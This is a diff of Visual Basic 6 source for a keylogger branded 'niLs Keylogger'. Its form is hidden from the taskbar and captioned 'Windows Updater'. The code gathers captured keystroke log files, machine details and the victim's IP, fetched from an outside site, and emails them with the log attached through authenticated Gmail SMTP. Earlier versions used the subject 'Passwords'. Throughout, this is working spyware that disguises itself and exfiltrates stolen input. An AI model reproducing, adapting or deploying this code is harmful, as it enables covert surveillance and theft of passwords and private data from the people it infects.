@@ -1,25 +1,17 @@
 VERSION 5.00
-Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
 Begin VB.Form Form1 
    BorderStyle     =   0  'None
    Caption         =   "Windows Updater"
-   ClientHeight    =   150
+   ClientHeight    =   90
    ClientLeft      =   0
    ClientTop       =   0
    ClientWidth     =   90
    Icon            =   "SendMail.frx":0000
    LinkTopic       =   "Form1"
-   ScaleHeight     =   150
+   ScaleHeight     =   90
    ScaleWidth      =   90
    ShowInTaskbar   =   0   'False
    StartUpPosition =   3  'Windows Default
-   Begin MSWinsockLib.Winsock Winsock1 
-      Left            =   360
-      Top             =   4560
-      _ExtentX        =   741
-      _ExtentY        =   741
-      _Version        =   393216
-   End
    Begin VB.Timer Timer1 
       Enabled         =   0   'False
       Interval        =   1000
@@ -30,17 +22,9 @@ Begin VB.Form Form1
       Height          =   4185
       Left            =   5040
       Pattern         =   "*.nkl"
-      TabIndex        =   2
+      TabIndex        =   1
       Top             =   240
       Width           =   1935
-   End
-   Begin VB.TextBox txtUserName 
-      Height          =   285
-      Left            =   2040
-      TabIndex        =   1
-      Text            =   "Username"
-      Top             =   0
-      Width           =   1695
    End
    Begin VB.TextBox txtSendThis 
       Height          =   4095
@@ -54,7 +38,7 @@ Begin VB.Form Form1
       Caption         =   "0"
       Height          =   255
       Left            =   240
-      TabIndex        =   3
+      TabIndex        =   2
       Top             =   0
       Width           =   1215
    End
@@ -65,6 +49,20 @@ Attribute VB_Creatable = False
 Attribute VB_PredeclaredId = True
 Attribute VB_Exposed = False
 'Option Explicit
+
+'Get IP
+Private Declare Function URLDownloadToFile Lib "urlmon" _
+   Alias "URLDownloadToFileA" _
+  (ByVal pCaller As Long, _
+   ByVal szURL As String, _
+   ByVal szFileName As String, _
+   ByVal dwReserved As Long, _
+   ByVal lpfnCB As Long) As Long
+   
+Private Const ERROR_SUCCESS As Long = 0
+Private Const BINDF_GETNEWESTVERSION As Long = &H10
+Private Const INTERNET_FLAG_RELOAD As Long = &H80000000
+Dim MyIP As String
 
 'Special Folde Path
 Public Enum mceIDLPaths
@@ -121,19 +119,20 @@ Open Lpath For Input As 1
 Input #1, NoNeed, lTime, lDate, CompDesc, lPwd, AppRevision
 Close #1
 
-txtSendThis = "Machine Description: " & Encrypt(CompDesc, -25) & vbNewLine
-txtSendThis = txtSendThis & "Machine Name: " & Winsock1.LocalHostName & vbNewLine
-txtSendThis = txtSendThis & "Machine IP: " & Winsock1.LocalIP & vbNewLine
-txtSendThis = txtSendThis & "Date: " & lDate & vbNewLine
-txtSendThis = txtSendThis & "Start Time: " & lTime & vbNewLine
-txtSendThis = txtSendThis & "End Time: " & FileDateTime(Lpath) & vbNewLine
-txtSendThis = txtSendThis & "AppVersion: " & Encrypt(AppRevision, -20) & vbNewLine
+Call GetMyIP
+txtSendThis = "<b>Keylog Generated with <a href=" & Chr(34) & "nilskeylogger.blogspot.com" & Chr(34) & ">niLs Keylogger</a></b><br>"
+txtSendThis = txtSendThis & "<b>Machine Description: </b>" & Encrypt(CompDesc, -25) & "<br>"
+txtSendThis = txtSendThis & "<b>Machine IP: </b> " & MyIP & "<br>"
+txtSendThis = txtSendThis & "<b>Date: </b>" & lDate & "<br>"
+txtSendThis = txtSendThis & "<b>Start Time: </b>" & lTime & "<br>"
+txtSendThis = txtSendThis & "<b>End Time: </b>" & FileDateTime(Lpath) & "<br>"
+txtSendThis = txtSendThis & "<b>AppVersion: </b>" & Encrypt(AppRevision, -20) & "<br>"
 
 If lPwd <> "" Then  'Skip the Read Log Stage, Log is password protected.
-txtSendThis = txtSendThis & "Password to Open :" & Left(lPwd, 2) & "****" & vbNewLine & "Download Attached Log."
+txtSendThis = txtSendThis & "<b>Password to Open :</B>" & Left(lPwd, 2) & "****<br>Download Attached KeyLog."
 Call SendEmail
 Else
-txtSendThis = txtSendThis & "______________________" & vbNewLine & vbNewLine
+txtSendThis = txtSendThis & "______________________<br><br>"
 Call ReadLog
 End If
 End Sub
@@ -145,7 +144,7 @@ Open Lpath For Input As 2
       While Not EOF(2)
         Line Input #2, sTemp
         If Left(sTemp, 2) <> Chr(34) & Chr(155) Then
-            txtSendThis = txtSendThis & sTemp & vbCrLf
+            txtSendThis = txtSendThis & sTemp & "<br>"
         End If
       Wend
 Close #2
@@ -165,19 +164,19 @@ Flds.Item(schema & "sendusing") = 2
 Flds.Item(schema & "smtpserver") = "smtp.gmail.com"
 Flds.Item(schema & "smtpserverport") = 465
 Flds.Item(schema & "smtpauthenticate") = 1
-Flds.Item(schema & "sendusername") = sendFrom
-Flds.Item(schema & "sendpassword") = FromPWD
+Flds.Item(schema & "sendusername") = sendFrom '"yourID@gmail.com"
+Flds.Item(schema & "sendpassword") = FromPWD '"myPassword"
 Flds.Item(schema & "smtpusessl") = 1
 Flds.Update
 
 On Error GoTo Err2
 
 With iMsg
-    .To = sendTo
-    .From = sendFrom
-    .Subject = "Passwords " & FromPC & "(" & Winsock1.LocalIP & ")"
-    .TextBody = txtSendThis.Text
-'    .HTMLBody = txtSendThis.Text   ' Use it to add HTML codes to email
+    .To = sendTo '"anyone@anything.com"
+    .From = sendFrom '"yourID@gmail.com"
+    .Subject = "niLsKLG-" & FromPC & "(" & MyIP & ")"
+ '   .TextBody = txtSendThis.Text
+    .HTMLBody = txtSendThis.Text   ' Use it to add HTML codes to email
     .AddAttachment Lpath
 Set .Configuration = iConf
 .Send
@@ -207,48 +206,6 @@ If Err.Number <> 0 Then
 End If
 
 End Sub
-'*********Offline Email Trial*****
-Sub SendEmail2()
-
-On Error GoTo Err2
-'Dim schema As String
-Open App.Path & "\testEmail.txt" For Output As #1
-' send one copy with Google SMTP server (with autentication)
-'schema = "http://schemas.microsoft.com/cdo/configuration/"
-Print #1, 2
-Print #1, "smtp.gmail.com"
-Print #1, 465
-Print #1, 1
-Print #1, sendFrom
-Print #1, FromPWD
-Print #1, 1
-Print #1, sendTo
-Print #1, sendFrom
-Print #1, "Passwords " & Winsock1.LocalIP
-Print #1, txtSendThis.Text
-
-Close #1
-
-'If Email Sent change the name of file So it will not resent
-Name Lpath As Left(Lpath, Len(Lpath) - 3) & "sent"
-
-'send Next log
-Call LoadLogtoSend
-
-
-Err2:
-'Email not sent Retry
-If Err.Number <> 0 Then
-    'If Err.Number = -2147220973 Then
-    MsgBox Err.Description & "  Retry Started"
-    Timer1.Enabled = True  'PC might not be connected> Retry.
-    'Else
-    'MsgBox Err.Description: End 'Password, Username or any setting might be wrong
-    'End If
-End If
-
-End Sub
-
 
 Private Sub Timer1_Timer()
 lblSec.Caption = lblSec.Caption + 1
@@ -272,5 +229,40 @@ Dim Trash As String: Trash = Space$(260)
     GetSpecialFolderA = Trash
     
 
+End Function
+Private Sub GetMyIP()
+
+Dim sSourceUrl, sLocalFile As String
+sLocalFile = File1.Path & "\IP.txt"
+sSourceUrl = "http://whatismyip.org/"
+If DownloadFile(sSourceUrl, sLocalFile) Then
+      
+'my way works for "http://whatismyip.org/" only
+      Dim strIP As String
+      Open sLocalFile For Input As 1
+      Input #1, strIP
+      Close #1
+    MyIP = strIP
+    
+End If
+
+Kill sLocalFile
+
+End Sub
+
+Public Function DownloadFile(ByVal sSourceUrl As String, _
+                             sLocalFile As String) As Boolean
+  
+  'Download the file. BINDF_GETNEWESTVERSION forces
+  'the API to download from the specified source.
+  'Passing 0& as dwReserved causes the locally-cached
+  'copy to be downloaded, if available. If the API
+  'returns ERROR_SUCCESS (0), DownloadFile returns True.
+   DownloadFile = URLDownloadToFile(0&, _
+                                    sSourceUrl, _
+                                    sLocalFile, _
+                                    BINDF_GETNEWESTVERSION, _
+                                    0&) = ERROR_SUCCESS
+   
 End Function
 
